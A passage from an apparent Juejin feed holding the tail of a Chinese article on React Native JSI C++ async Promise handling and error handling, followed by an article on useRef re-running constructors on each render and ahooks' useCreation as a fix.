    }
  
    <span class="hljs-keyword">return</span> Value::<span class="hljs-built_in">undefined</span>();
  }
};
</code></pre>
<p>这样，上层JS 调用<code>fetchAsync</code>方法时，就会得到一个<strong>Promise</strong>对象，直到底层的子线程执行完任务后，将结果返回，上层Promise才会返回结果。整个耗时操作都由底层C++线程完成，不会阻塞JS线程，在整个耗时任务期间，JS线程都可以继续执行其他任务。</p>
<h4 data-id="heading-24">一些工具类</h4>
<p>关于<code>Promise</code> 辅助类的使用。可以查看头文件<code>react-native/packages/react-native/ReactCommon/react/nativemodule/core/ReactCommon/TurboModuleUtils.h</code>：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Promise</span> : <span class="hljs-keyword">public</span> LongLivedObject {
  <span class="hljs-built_in">Promise</span>(jsi::Runtime &amp;rt, jsi::Function resolve, jsi::Function reject);

  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">resolve</span><span class="hljs-params">(<span class="hljs-type">const</span> jsi::Value &amp;result)</span></span>;
  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reject</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;message)</span></span>;

  jsi::Function resolve_;
  jsi::Function reject_;
};

<span class="hljs-keyword">using</span> PromiseSetupFunctionType = std::function&lt;<span class="hljs-built_in">void</span>(jsi::Runtime &amp;rt, std::shared_ptr&lt;Promise&gt;)&gt;;
<span class="hljs-function">jsi::Value <span class="hljs-title">createPromiseAsJSIValue</span><span class="hljs-params">(jsi::Runtime &amp;rt, PromiseSetupFunctionType &amp;&amp;func)</span></span>;

} 
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 在 HostFunction 中返回 Promise</span>
<span class="hljs-keyword">return</span> <span class="hljs-built_in">createPromiseAsJSIValue</span>(rt, [jsInvoker](Runtime&amp; rt, std::shared_ptr&lt;Promise&gt; promise) {
  <span class="hljs-comment">// 异步操作</span>
  std::<span class="hljs-built_in">thread</span>([jsInvoker, promise]() {
    <span class="hljs-comment">// 后台工作...</span>
  
    <span class="hljs-comment">// 完成后调度到 JS 线程</span>
    jsInvoker-&gt;<span class="hljs-built_in">invokeAsync</span>([promise](Runtime&amp; rt) {
      promise-&gt;<span class="hljs-built_in">resolve</span>(<span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>));  <span class="hljs-comment">// 或 promise-&gt;reject("error")</span>
    });
  }).<span class="hljs-built_in">detach</span>();
});
</code></pre>
<p><code>LongLivedObject</code> 可以防止过早的内存回收：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyData</span> : <span class="hljs-keyword">public</span> LongLivedObject {
 <span class="hljs-keyword">public</span>:
  <span class="hljs-built_in">MyData</span>(Runtime&amp; rt) : <span class="hljs-built_in">LongLivedObject</span>(rt) {}
  
  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">done</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">allowRelease</span>();  <span class="hljs-comment">// 允许被回收</span>
  }
};

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">auto</span> data = std::<span class="hljs-built_in">make_shared</span>&lt;MyData&gt;(runtime);
LongLivedObjectCollection::<span class="hljs-built_in">get</span>(runtime).<span class="hljs-built_in">add</span>(data);  <span class="hljs-comment">// 防止回收</span>
<span class="hljs-comment">// ... 使用 data</span>
data-&gt;<span class="hljs-built_in">allowRelease</span>();  <span class="hljs-comment">// 不需要时记得释放</span>
</code></pre>
<h4 data-id="heading-25">常见错误示例</h4>
<h5 data-id="heading-26">错误 1：直接在后台线程调用 JSI</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ❌ 错误</span>
std::<span class="hljs-built_in">thread</span>([&amp;runtime, callback]() {
  callback.<span class="hljs-built_in">call</span>(runtime, <span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>));  <span class="hljs-comment">// CRASH!</span>
}).<span class="hljs-built_in">detach</span>();

<span class="hljs-comment">// ✅ 正确</span>
std::<span class="hljs-built_in">thread</span>([jsInvoker, callback = std::<span class="hljs-built_in">move</span>(callback)]() <span class="hljs-keyword">mutable</span> {
  jsInvoker-&gt;<span class="hljs-built_in">invokeAsync</span>([callback = std::<span class="hljs-built_in">move</span>(callback)](Runtime&amp; rt) {
    callback.<span class="hljs-built_in">call</span>(rt, <span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>));
  });
}).<span class="hljs-built_in">detach</span>();
</code></pre>
<h5 data-id="heading-27">错误 2：在异步回调中直接使用 runtime 引用</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ❌ 错误：runtime 引用可能失效</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">asyncOp</span><span class="hljs-params">(Runtime&amp; runtime, Function callback)</span> </span>{
  std::<span class="hljs-built_in">thread</span>([&amp;runtime, callback]() {  <span class="hljs-comment">// 引用捕获危险</span>
    jsInvoker-&gt;<span class="hljs-built_in">invokeAsync</span>([&amp;runtime, callback](Runtime&amp;) {
      callback.<span class="hljs-built_in">call</span>(runtime, <span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>));  <span class="hljs-comment">// runtime 可能已销毁</span>
    });
  }).<span class="hljs-built_in">detach</span>();
}

<span class="hljs-comment">// ✅ 正确：使用 lambda 传入的 runtime</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">asyncOp</span><span class="hljs-params">(Runtime&amp; runtime, Function callback, std::shared_ptr&lt;CallInvoker&gt; jsInvoker)</span> </span>{
  jsInvoker-&gt;<span class="hljs-built_in">invokeAsync</span>([callback = std::<span class="hljs-built_in">move</span>(callback)](Runtime&amp; rt) {
    callback.<span class="hljs-built_in">call</span>(rt, <span class="hljs-built_in">Value</span>(<span class="hljs-number">42</span>));  <span class="hljs-comment">// 使用 lambda 参数rt</span>
  });
}
</code></pre>
<h5 data-id="heading-28">错误 3：忘记 Promise 生命周期管理</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ❌ 错误：Promise 可能被释放</span>
<span class="hljs-keyword">auto</span> promise = std::<span class="hljs-built_in">make_shared</span>&lt;Promise&gt;(rt, resolve, reject);
std::<span class="hljs-built_in">thread</span>([promise]() {
  <span class="hljs-comment">// Promise 可能被释放</span>
}).<span class="hljs-built_in">detach</span>();

<span class="hljs-comment">// ✅ 正确：使用 createPromiseAsJSIValue（自动管理）</span>
<span class="hljs-keyword">return</span> <span class="hljs-built_in">createPromiseAsJSIValue</span>(rt, [](Runtime&amp; rt, std::shared_ptr&lt;Promise&gt; promise) {
  <span class="hljs-comment">// promise 已自动加入 LongLivedObjectCollection</span>
});
</code></pre>
<p>关于<code>createPromiseAsJSIValue</code>函数，前面已经演示过了。</p>
<h3 data-id="heading-29">错误处理</h3>
<p>看一个完整JSI错误处理示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Value <span class="hljs-title">safeCall</span><span class="hljs-params">(Runtime&amp; runtime, <span class="hljs-type">const</span> Function&amp; func, <span class="hljs-type">const</span> Value* args, <span class="hljs-type">size_t</span> count)</span> </span>{
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">return</span> func.<span class="hljs-built_in">call</span>(runtime, args, count);
  } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> JSError&amp; e) {
    <span class="hljs-comment">// JS 异常</span>
    std::cerr &lt;&lt; <span class="hljs-string">"JS Error: "</span> &lt;&lt; e.<span class="hljs-built_in">getMessage</span>() &lt;&lt; std::endl;
    std::cerr &lt;&lt; <span class="hljs-string">"Stack: "</span> &lt;&lt; e.<span class="hljs-built_in">getStack</span>() &lt;&lt; std::endl;
    <span class="hljs-keyword">throw</span>;
  } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> JSINativeException&amp; e) {
    <span class="hljs-comment">// JSI 原生异常</span>
    std::cerr &lt;&lt; <span class="hljs-string">"Native Error: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
    <span class="hljs-keyword">throw</span>;
  } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::exception&amp; e) {
    <span class="hljs-comment">// 其他 C++ 异常</span>
    std::cerr &lt;&lt; <span class="hljs-string">"C++ Error: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">JSError</span>(runtime, e.<span class="hljs-built_in">what</span>());
  }
}
</code></pre>
<p>追踪详细的异常栈：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">executeWithStackTrace</span><span class="hljs-params">(Runtime&amp; runtime, <span class="hljs-type">const</span> std::string&amp; code)</span> </span>{
  <span class="hljs-keyword">try</span> {
    runtime.<span class="hljs-built_in">evaluateJavaScript</span>(
        std::<span class="hljs-built_in">make_shared</span>&lt;StringBuffer&gt;(code),
        <span class="hljs-string">"debug.js"</span>);
  } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> JSError&amp; e) {
    std::cerr &lt;&lt; <span class="hljs-string">"=== JavaScript Error ==="</span> &lt;&lt; std::endl;
    std::cerr &lt;&lt; <span class="hljs-string">"Message: "</span> &lt;&lt; e.<span class="hljs-built_in">getMessage</span>() &lt;&lt; std::endl;
    std::cerr &lt;&lt; <span class="hljs-string">"Stack:\n"</span> &lt;&lt; e.<span class="hljs-built_in">getStack</span>() &lt;&lt; std::endl;
  
    <span class="hljs-comment">// 可以进一步解析堆栈</span>
    <span class="hljs-function">std::istringstream <span class="hljs-title">stream</span><span class="hljs-params">(e.getStack())</span></span>;
    std::string line;
    <span class="hljs-type">int</span> frameNum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (std::<span class="hljs-built_in">getline</span>(stream, line)) {
      std::cerr &lt;&lt; <span class="hljs-string">"  #"</span> &lt;&lt; frameNum++ &lt;&lt; <span class="hljs-string">" "</span> &lt;&lt; line &lt;&lt; std::endl;
    }
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[useRef存在的潜在性能问题]]></title>    <link>https://juejin.cn/post/7594322573453475883</link>    <guid>https://juejin.cn/post/7594322573453475883</guid>    <pubDate>2026-01-13T02:39:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453475883" data-draft-id="7594627998838849578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="useRef存在的潜在性能问题"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T02:39:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jolyne_"/> <meta itemprop="url" content="https://juejin.cn/user/339101640827981"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            useRef存在的潜在性能问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/339101640827981/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jolyne_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:39:39.000Z" title="Tue Jan 13 2026 02:39:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在学习ahooks源码时，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fahooks.js.org%2Fzh-CN%2Fhooks%2Fuse-creation" target="_blank" title="https://ahooks.js.org/zh-CN/hooks/use-creation" ref="nofollow noopener noreferrer">useCreation</a>时，发现官方文档写了这样一句话</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b70e4c251d0a4d06aa342f709b111f9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=%2FA5cQGm%2FBd%2BevL0JexOBkFm0Xv0%3D" alt="image.png" loading="lazy"/></p>
<p>第一眼后，我心想：useRef 不是只会执行一次吗？并且不会随组件生命周期变化吗？然后根据官方文档的例子试了一下，发现 useRef 在存储复杂数据类型时（比如对象），确实有性能问题</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constructor==="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { current } = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>());
  <span class="hljs-keyword">const</span> [, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{current.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>在上面的代码中，组件初始化时，会执行一次 <code>new Subject()</code>，控制台会打印一次 <code>===constructor===</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b792171f824047799cd042c99e3a7213~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=2Da7KxYhRJecArUBIJzqNARDCME%3D" alt="image.png" loading="lazy"/></p>
<p>当我点击按钮触发组件重新渲染时，虽然渲染的值没有变，但是控制台依旧打印了<code>===constructor===</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/038f6c0d4bd443359d963521ef4d81ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=MWyx9HvnMJXJyL0wDe5luu8Lzv8%3D" alt="image.png" loading="lazy"/></p>
<p>也就是说明：组件重新渲染时，虽然React内部判断后，返回了首次渲染时的值，<code>但是在每次组件渲染时，都会执行 new Subject() 实例化过程，即使每次实例化后，都丢弃了实例化对象</code>，而重复实例化对象就是一种<code>无效的内存开销</code>，即性能存在隐患</p>
<p>因此我重新看了下React文档对于 useRef 的说明：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2fa1ebe91464e6c95138a340ee862cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=xY34SjVqTcng75%2FTPsoYdPrsmzk%3D" alt="image.png" loading="lazy"/></p>
<p>可见 React 官方就已经对这种情况进行了说明，并且也给出了解决方案，思想与<code>单例模式</code>一致</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Video</span>(<span class="hljs-params"/>) {  
    <span class="hljs-keyword">const</span> playerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);  
    <span class="hljs-keyword">if</span> (playerRef.<span class="hljs-property">current</span> === <span class="hljs-literal">null</span>) {  
        playerRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoPlayer</span>();  
    }  
    <span class="hljs-comment">// ...</span>
</code></pre>
<p>然后我们回过头来，可以看看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fahooks.js.org%2Fzh-CN%2Fhooks%2Fuse-creation" target="_blank" title="https://ahooks.js.org/zh-CN/hooks/use-creation" ref="nofollow noopener noreferrer">useCreation</a> 是怎么做的</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">DependencyList</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> depsAreSame <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/depsAreSame'</span>;

<span class="hljs-keyword">const</span> useCreation = &lt;T&gt;<span class="hljs-function">(<span class="hljs-params">factory: () =&gt; T, deps: DependencyList</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { current } = <span class="hljs-title function_">useRef</span>({
    deps,
    <span class="hljs-attr">obj</span>: <span class="hljs-literal">undefined</span> <span class="hljs-keyword">as</span> T,
    <span class="hljs-attr">initialized</span>: <span class="hljs-literal">false</span>,
  });
  <span class="hljs-keyword">if</span> (current.<span class="hljs-property">initialized</span> === <span class="hljs-literal">false</span> || !<span class="hljs-title function_">depsAreSame</span>(current.<span class="hljs-property">deps</span>, deps)) {
    current.<span class="hljs-property">deps</span> = deps;
    current.<span class="hljs-property">obj</span> = <span class="hljs-title function_">factory</span>();
    current.<span class="hljs-property">initialized</span> = <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> current.<span class="hljs-property">obj</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useCreation;
</code></pre>
<ul>
<li>如果是首次渲染（<code>initialized === false</code>）或者 依赖项发生了改变（<code>!depsAreSame(current.deps, deps)</code>），则执行 <code>factory()</code>函数创建值</li>
<li>如果不满足条件，直接返回之前的值（<code>此时不会走 factory()</code>）</li>
</ul>
<p>这样就保证了通过 useCreation 创建的值一定是 memosized，依赖改变前是保证不会重新计算的</p>
<p>我们将 useCreation 代替 useRef 试试</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useCreation } <span class="hljs-keyword">from</span> <span class="hljs-string">"ahooks"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constrcutor====="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">const</span> foo = <span class="hljs-title function_">useCreation</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>(), []);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{foo.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>点击按钮，组件重新渲染，不会执行 new Subject() 的实例化过程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e1181a6b21c418cb0e485c27047d9ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=vUNJsNePjjK5sczsj2qyIuoJIxY%3D" alt="image.png" loading="lazy"/></p>
<p>那如果依赖发生改变，每次也只会重新计算一次</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useCreation } <span class="hljs-keyword">from</span> <span class="hljs-string">"ahooks"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constrcutor====="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">const</span> foo = <span class="hljs-title function_">useCreation</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>(), [flag]);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{foo.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
